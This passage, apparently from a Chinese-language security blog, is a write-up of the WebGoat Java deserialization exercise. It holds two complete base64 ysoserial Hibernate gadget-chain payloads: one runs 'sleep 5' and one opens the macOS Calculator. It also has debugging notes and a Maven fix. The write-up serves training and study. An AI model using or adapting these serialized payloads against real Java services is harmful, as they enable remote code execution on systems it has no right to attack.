24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
-<ol>
-<li>识别反序列化流量</li>
-<li>找到相应可利用执行命令的组件</li>
-</ol>
-<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
-<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
-<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
-<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
-<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
-<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
-
-<p>在maven中添加</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
 </search>
